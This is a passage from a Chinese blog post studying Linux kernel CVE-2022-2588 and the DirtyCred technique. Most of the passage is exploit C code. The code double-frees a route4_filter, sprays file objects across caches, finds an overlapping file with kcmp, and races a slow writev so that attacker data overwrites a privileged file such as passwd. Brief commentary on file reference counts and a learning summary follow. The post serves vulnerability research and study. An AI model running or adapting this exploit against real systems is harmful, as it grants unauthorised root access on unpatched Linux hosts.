delete_tc_basic(sprayfd, i + <span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (write(pipe_child[<span class="number">1</span>], <span class="string">&quot;OK&quot;</span>, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;[-] write to parent\n&quot;</span>);</span><br><span class="line"><span class="comment">// 7. free (end-middle+1)*32 kmalloc-192 &amp; kmalloc-256</span></span><br><span class="line">      <span class="keyword">if</span> (read(pipe_parent[<span class="number">0</span>], msg, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;[-] read from parent&quot;</span>);</span><br><span class="line">      <span class="comment">// if (cpu_cores == 1) sleep(1);</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[7] free (end-middle+1)*32 kmalloc-192 &amp; kmalloc-256\n&quot;</span>);</span><br><span class="line">      delete_tc_basic(sprayfd, middle + <span class="number">2</span>);</span><br><span class="line">      delete_tc_basic(sprayfd, middle + <span class="number">3</span>);</span><br><span class="line">      delete_tc_basic(sprayfd, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i = middle + <span class="number">2</span>; i &lt; end; i++)</span><br><span class="line">        delete_tc_basic(sprayfd, i + <span class="number">1</span>);</span><br><span class="line">      <span class="comment">//getchar();</span></span><br><span class="line">      <span class="keyword">if</span> (write(pipe_child[<span class="number">1</span>], <span class="string">&quot;OK&quot;</span>, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;[-] write to parent\n&quot;</span>);</span><br><span class="line">      <span class="keyword">while</span> (<span class="number">1</span>) &#123;sleep(<span class="number">1000</span>);&#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>进程D是关键进程，首先确定已经可以doublefree了，然后喷射一堆低凭证file,接着第一次kfree大小为0x100的obj,然后喷射一堆低凭证file拿到刚free的obj,接着doublefree这个obj,然后再喷射低凭证file,这样就有两个文件描述符指向同一个file而且这个file的f_count为1，接着开启三个线程，替换第凭证为高凭证，前面我已经说过过程了，就不赘述了.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">slow_write</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[11-1] start slow write\n&quot;</span>);</span><br><span class="line">  <span class="keyword">clock_t</span> start, end;</span><br><span class="line">  <span class="keyword">int</span> fd = open(<span class="string">&quot;./uaf&quot;</span>, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;[-] error open uaf file&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> addr = <span class="number">0x30000000</span>;</span><br><span class="line">  <span class="keyword">int</span> offset;</span><br><span class="line">  <span class="keyword">for</span> (offset = <span class="number">0</span>; offset &lt; <span class="number">0x80000</span> / <span class="number">20</span>; offset++) &#123;     <span class="comment">// mmap space [0x30000000, 0x30000000 + 0x1000 * 0x80000 / 20]</span></span><br><span class="line">    <span class="keyword">void</span> *r = mmap((<span class="keyword">void</span> *)(addr + offset * <span class="number">0x1000</span>), <span class="number">0x1000</span>,</span><br><span class="line">                   PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (r &lt; <span class="number">0</span>)</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[-] allocate failed at 0x%x\n&quot;</span>, offset);</span><br><span class="line">  &#125;</span><br><span class="line">  assert(offset &gt; <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *mem = (<span class="keyword">void</span> *)(addr);</span><br><span class="line">  <span class="built_in">memcpy</span>(mem, <span class="string">&quot;hhhhh&quot;</span>, <span class="number">5</span>);</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span>[20];</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++) &#123; <span class="comment">// write plenty of data (0x80000 * 0x1000 = 0x80 000 000 = 2GB)</span></span><br><span class="line">    iov[i].iov_base = mem;</span><br><span class="line">    iov[i].iov_len = offset * <span class="number">0x1000</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  run_write = <span class="number">1</span>;    <span class="comment">// notifiy thread 2 (unprivileged `file`) begin to write evil data</span></span><br><span class="line">  start = clock();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (writev(fd, iov, <span class="number">20</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    perror(<span class="string">&quot;slow write&quot;</span>);</span><br><span class="line">  end = clock();</span><br><span class="line">  <span class="keyword">double</span> spent = (<span class="keyword">double</span>)(end - start) / CLOCKS_PER_SEC;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] write done, spent %f s\n&quot;</span>, spent);</span><br><span class="line">  run_write = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// write_cmd() —— thread 2: write evil data to the privileged file</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">write_cmd</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span> =</span> &#123;.iov_base = content, .iov_len = <span class="built_in">strlen</span>(content)&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (!run_write) &#123;&#125;  <span class="comment">// wait for thread 1 to prepare write</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[11-2] write evil data after the slow write\n&quot;</span>);</span><br><span class="line">  run_spray = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (writev(overlap_a, &amp;iov, <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] failed to write\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">exploit</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> msg[<span class="number">0x10</span>] = &#123;&#125;;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">rlimit</span> <span class="title">old_lim</span>, <span class="title">lim</span>, <span class="title">new_lim</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Get old limits</span></span><br><span class="line">  <span class="keyword">if</span> (getrlimit(RLIMIT_NOFILE, &amp;old_lim) == <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Old limits -&gt; soft limit= %ld \t&quot;</span></span><br><span class="line">           <span class="string">&quot; hard limit= %ld \n&quot;</span>,</span><br><span class="line">           old_lim.rlim_cur, old_lim.rlim_max);</span><br><span class="line">  pin_on_cpu(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] starting exploit, num of cores: %d\n&quot;</span>, cpu_cores);</span><br><span class="line">  <span class="comment">// open &amp; setup the socket</span></span><br><span class="line">  sockfd = socket(PF_NETLINK, SOCK_RAW, <span class="number">0</span>);</span><br><span class="line">  assert(sockfd != <span class="number">-1</span>);</span><br><span class="line">  add_qdisc(sockfd);</span><br><span class="line"><span class="comment">// 3. allocate a route4_filter (vulnerable object)</span></span><br><span class="line">  <span class="keyword">if</span> (read(pipe_child[<span class="number">0</span>], msg, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">&quot;[-] read from parent&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[3] allocate the vulnerable filter\n&quot;</span>);</span><br><span class="line">  add_tc_(sockfd, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, NLM_F_EXCL | NLM_F_CREATE);  <span class="comment">// handle = 0</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (write(pipe_parent[<span class="number">1</span>], <span class="string">&quot;OK&quot;</span>, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">&quot;[-] write to child&quot;</span>);</span><br><span class="line"><span class="comment">// 6. 1st free the route4_filter, return the `kmalloc-256` page to the page allocator</span></span><br><span class="line">  <span class="keyword">if</span> (read(pipe_child[<span class="number">0</span>], msg, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">&quot;[-] read from parent&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// free the object, to free the slab</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[6] 1st freed the filter object\n&quot;</span>);</span><br><span class="line">  <span class="comment">// getchar();</span></span><br><span class="line">  add_tc_(sockfd, <span class="number">0x11</span>, <span class="number">0x12</span>, <span class="number">0</span>, NLM_F_CREATE);         <span class="comment">// handle = 0</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// wait for the vulnerable object being freed</span></span><br><span class="line">  usleep(<span class="number">500</span> * <span class="number">1000</span>);</span><br><span class="line">  <span class="keyword">if</span> (write(pipe_parent[<span class="number">1</span>], <span class="string">&quot;OK&quot;</span>, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">&quot;[-] write to child&quot;</span>);</span><br><span class="line"><span class="comment">// 8. spray 4000 unprivileged `file`</span></span><br><span class="line">  <span class="keyword">if</span> (read(pipe_child[<span class="number">0</span>], msg, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">&quot;[-] read from parent&quot;</span>);</span><br><span class="line"></span><br><span class="line">  usleep(<span class="number">1000</span> * <span class="number">1000</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[8] spray 4000 uprivileged `file`\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; spray_num_1; i++) &#123;</span><br><span class="line">    pin_on_cpu(i % cpu_cores);</span><br><span class="line">    fds[i] = open(<span class="string">&quot;./data2&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    assert(fds[i] &gt; <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// printf(&quot;pause before 2nd free\n&quot;);</span></span><br><span class="line">  <span class="comment">// getchar();</span></span><br><span class="line"><span class="comment">// 9. 2nd free route4_filter, which will free the file</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[9] 2nd free the filter object\n&quot;</span>);</span><br><span class="line">  add_tc_(sockfd, <span class="number">0x11</span>, <span class="number">0x13</span>, <span class="number">0</span>, NLM_F_CREATE);         <span class="comment">// handle = 0</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;pause after 2nd free\n&quot;</span>);</span><br><span class="line">  <span class="comment">// getchar();</span></span><br><span class="line">  <span class="comment">// sleep(10000);</span></span><br><span class="line">  usleep(<span class="number">1000</span> * <span class="number">100</span>);   <span class="comment">// should not sleep too long, otherwise file might be claimed by others</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 10. spray 5000 unprivileged `file` &amp; find the overlapped file</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[10] spraying 5000 unprivileged `file`\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; spray_num_2; i++) &#123;</span><br><span class="line">    pin_on_cpu(i % cpu_cores);</span><br><span class="line">    fd_2[i] = open(<span class="string">&quot;./uaf&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    assert(fd_2[i] &gt; <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; spray_num_1; j++) &#123;</span><br><span class="line"><span class="comment">// 10-1. spray one `file` &amp; use kcmp to check if we take up the vulnerable object</span></span><br><span class="line">      <span class="keyword">if</span> (syscall(__NR_kcmp, getpid(), getpid(), KCMP_FILE, fds[j], fd_2[i]) == <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[10-1] found overlapped file, id : %d, %d\n&quot;</span>, i, j);</span><br><span class="line">        overlap_a = fds[j];</span><br><span class="line">        overlap_b = fd_2[i];</span><br><span class="line"><span class="comment">// 11. start 2 threads: Thread 1-take up write lock; Thread 2-write evil data</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[11] start 2 threads compete to write\n&quot;</span>);</span><br><span class="line">        <span class="keyword">pthread_t</span> pid, pid2;</span><br><span class="line">        pthread_create(&amp;pid, <span class="literal">NULL</span>, slow_write, <span class="literal">NULL</span>);</span><br><span class="line">        pthread_create(&amp;pid2, <span class="literal">NULL</span>, write_cmd, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (!run_spray) &#123;&#125;</span><br><span class="line"><span class="comment">// 12. spray privileged `file` object</span></span><br><span class="line">        close(overlap_a);     <span class="comment">// ??????????? why release twice ???????????</span></span><br><span class="line">        close(overlap_b);</span><br><span class="line"></span><br><span class="line">        usleep(<span class="number">1000</span> * <span class="number">100</span>);</span><br><span class="line">        <span class="keyword">int</span> spray_num = <span class="number">4096</span>;</span><br><span class="line">        write(pipe_file_spray[<span class="number">0</span>][<span class="number">1</span>], &amp;spray_num, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">        <span class="keyword">if</span> (read(pipe_file_spray[<span class="number">1</span>][<span class="number">0</span>], &amp;msg, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">          err(<span class="number">1</span>, <span class="string">&quot;[-] read from file spray&quot;</span>);</span><br><span class="line">        overlapped = <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (overlapped)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// 13. finish exploitation</span></span><br><span class="line">  sleep(<span class="number">3</span>);</span><br><span class="line">  <span class="keyword">while</span> (run_write) &#123;sleep(<span class="number">1</span>);&#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[13] check whether we overwrite the privileged file\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!overlapped) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] no overlap found :(...\n&quot;</span>);</span><br><span class="line">    write(pipe_main[<span class="number">1</span>], <span class="string">&quot;\xff&quot;</span>, <span class="number">1</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">int</span> xx = open(target, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x100</span>] = &#123;&#125;;</span><br><span class="line">    <span class="comment">// check if user (hi) in the passwd</span></span><br><span class="line">    read(xx, buf, <span class="number">0x30</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(buf, <span class="string">&quot;hi&quot;</span>, <span class="number">2</span>))</span><br><span class="line">      write(pipe_main[<span class="number">1</span>], <span class="string">&quot;\x00&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[-] not successful : %s\n&quot;</span>, buf);</span><br><span class="line">      write(pipe_main[<span class="number">1</span>], <span class="string">&quot;\xff&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;sleep(<span class="number">1000</span>);&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>具体过程可以看这两张图</p>
<p><img src="https://img-blog.csdnimg.cn/e177f920084e4a77b2d4efaad6ee5614.png#pic_center" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/8baa8820341340a18143b5ed2731daa8.png#pic_center" alt="在这里插入图片描述"></p>
<p>调试了半个晚上终于把exp中关于file结构体引用计数的问题解决了，在一个进程中，主线程和所有的支线程共用一个<code>struct files_struct</code>结构体，所以在创建线程的时候并不会像创建子进程一样给所有的<code>file</code>的结构体的引用计数<code>f_count</code>加一，但是只要在子线程中使用了这个文件描述符<strong>（注意是使用，只有使用了才会加一，使用完还会减一）</strong>，就会给对应的<code>file</code>的<code>f_count</code>加一，表示这个结构体正在被使用，所以在主线程close这个文件描述符之后，对应的<code>file</code>并没有被kfree掉，而是引用计数减一，但是这个file指针是在主线程中被清零的。而在某个地方肯定还记录着这个<code>file</code>的指针，以便后续kfree。</p>
<p>但比较奇怪的是一个进程只有线程的时候，就算使用这个文件描述符，文件描述符对应的<code>file</code>的引用计数还是没有变的。</p>
<p>这是支线程使用write正在写入时file的样子，可见f_count为2.</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20221207011459177.png" alt="image-20221207011459177"></p>
<p>当开启了支线程但是没有使用文件描述符时<code>file</code>的样子，可见f_count为1</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20221207011836162.png" alt="image-20221207011836162"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个cve的学习总算告一段落了，除了设置user namespace没怎么搞懂以外其他基本都明白了，也用exp调试打通了自己搭的环境，总的来说确实学到了好多。尤其是<code>cross cache</code>和<code>drity cred</code>，还深入的了解了文件描述符到底是个什么东东了。</p>

    </div>

    
    
    

      <footer class="post-footer">

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2023/02/08/c-study-tips/" rel="prev" title="c++ study tips">
      <i class="fa fa-chevron-left"></i> c++ study tips
    </a></div>
      <div class="post-nav-item">
    <a href="/2023/02/08/CVE-2022-4543%E5%8F%8Akpti%E6%9C%BA%E5%88%B6/" rel="next" title="CVE-2022-4543及kpti机制">
      CVE-2022-4543及kpti机制 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#cve-2022-2588%E5%AD%A6%E4%B9%A0"><span class="nav-number">1.</span> <span class="nav-text">cve-2022-2588学习</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86%E6%B5%85%E5%AD%A6"><span class="nav-number">1.1.</span> <span class="nav-text">前置知识浅学</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E8%B7%AF%E7%94%B1%E8%A1%A8"><span class="nav-number">1.1.1.</span> <span class="nav-text">内核路由表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E5%AD%90%E7%B3%BB%E7%BB%9F"><span class="nav-number">1.1.2.</span> <span class="nav-text">内核子系统</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#netlink"><span class="nav-number">1.1.3.</span> <span class="nav-text">netlink</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%94%A8%E6%88%B7%E6%80%81%E5%92%8C%E5%86%85%E6%A0%B8%E6%80%81%E5%8F%8C%E5%90%91%E9%80%9A%E4%BF%A1%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B"><span class="nav-number">1.1.3.1.</span> <span class="nav-text">用户态和内核态双向通信代码示例</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#linux%E6%B5%81%E9%87%8F%E6%8E%A7%E5%88%B6"><span class="nav-number">1.1.4.</span> <span class="nav-text">linux流量控制</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A6%82%E5%BF%B5%E7%90%86%E8%A7%A3"><span class="nav-number">1.1.4.1.</span> <span class="nav-text">概念理解</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84"><span class="nav-number">1.1.4.2.</span> <span class="nav-text">相关数据结构</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%B3%BB%E7%BB%9F%E8%B5%84%E6%BA%90%E6%8E%A7%E5%88%B6"><span class="nav-number">1.1.4.3.</span> <span class="nav-text">系统资源控制</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%A8%A1%E5%9D%97rtnetlink%E5%88%86%E6%9E%90"><span class="nav-number">1.2.</span> <span class="nav-text">漏洞模块rtnetlink分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#rtnetlink%E7%9B%B8%E5%85%B3%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-number">1.2.0.1.</span> <span class="nav-text">rtnetlink相关代码分析</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-number">1.3.</span> <span class="nav-text">漏洞原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-number">1.4.</span> <span class="nav-text">漏洞复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">1.4.1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#poc%E5%AD%A6%E4%B9%A0"><span class="nav-number">1.4.2.</span> <span class="nav-text">poc学习</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86"><span class="nav-number">1.4.3.</span> <span class="nav-text">漏洞利用原理</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#cross-cache-attack"><span class="nav-number">1.4.3.1.</span> <span class="nav-text">cross cache attack</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#dirty-cred"><span class="nav-number">1.4.3.2.</span> <span class="nav-text">dirty cred</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#struct-file"><span class="nav-number">1.4.3.2.1.</span> <span class="nav-text">struct file</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#struct-cred"><span class="nav-number">1.4.3.2.2.</span> <span class="nav-text">struct cred</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#reading-exp"><span class="nav-number">1.4.4.</span> <span class="nav-text">reading exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">1.5.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">rootzhang</p>
  <div class="site-description" itemprop="description">我的博客</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">47</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">rootzhang</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
